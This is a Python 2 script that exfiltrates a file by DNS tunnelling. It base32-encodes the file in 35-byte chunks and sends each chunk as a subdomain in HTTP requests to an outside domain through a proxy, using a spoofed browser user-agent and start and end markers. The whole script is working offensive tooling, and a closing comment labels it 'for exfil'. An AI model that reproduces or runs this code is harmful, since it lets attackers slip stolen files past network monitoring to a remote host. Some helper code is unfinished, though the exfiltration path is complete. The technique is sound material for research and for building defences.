import requests, base64, StringIO
import os,binascii,sys,time


#http_proxy="http://40.115.115.11:3128"
http_proxy  = "http://localhost:8080"
proxyDict = {"http"  : http_proxy,}

filename = sys.argv[1]

#create random ID for transaction to prevent caching
ran= binascii.b2a_hex(os.urandom(2))

rootdomain=".sub.modux.co.uk"
headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36'}

chunksize=35

def decoder(base64array):
    filedecode=''
   
    for i in base64array:
        filedecode+=i
    
def chunkstring(string, length):
    return (string[0+i:length+i] for i in range(0, len(string), length))

def padstring(chunk, chunksize):
        if len(chunk) == 0:
            return None
        padsize=chunksize-len(chunk)

        chunk+='_'*padsize
        return chunk

def sendrequest(string, count):
    # add random string at beginning to ensure query gets relayed
    print "sending " + string
    count=str(count)
    string=string.replace('=', '-')
    try:
        r = requests.get('http://'+str(ran)+'.'+count+'.'+string+rootdomain, headers=headers, proxies=proxyDict)
    except requests.exceptions.RequestException as e: 
        pass
    try:
        r = requests.get('http://'+str(ran)+'.'+count+'.'+string+rootdomain, headers=headers, proxies=proxyDict)
    except requests.exceptions.RequestException as e: 
        pass
        
def sendFile(instr):
    fullarray=[]
    
    # send start request
    print 'send start'
    print 'dns tunneling is slow, make a cup of tea or three...'
    count=1
    
    sendrequest('startoffile.'+filename, count)
    
        
    time.sleep(2)
    sleepcount=0
    while True: 
        chunk = file.read(chunksize) 
     #  time.sleep(0.01)

        # increment sleepcount to give DNS a rest  to increase reliability of file transfer
        if sleepcount==20:
            time.sleep(0.5)
            sleepcount=0
        else:
            sleepcount+=1
        if not chunk: break
     #     chunk
#        chunk=padstring(chunk,chunksize)
        b32file=base64.b32encode(chunk)
    
        sendrequest(b32file, count)
        count+=1
     
    # close sending request
    print 'sending end'
    time.sleep(2)

    sendrequest('endoffile', count)

    count=1
        
   # decoder(fullarray)
## for testing encoding function  
file = open(filename, "rb")

sendFile(file)
# for exfil - send request but don't wait for response

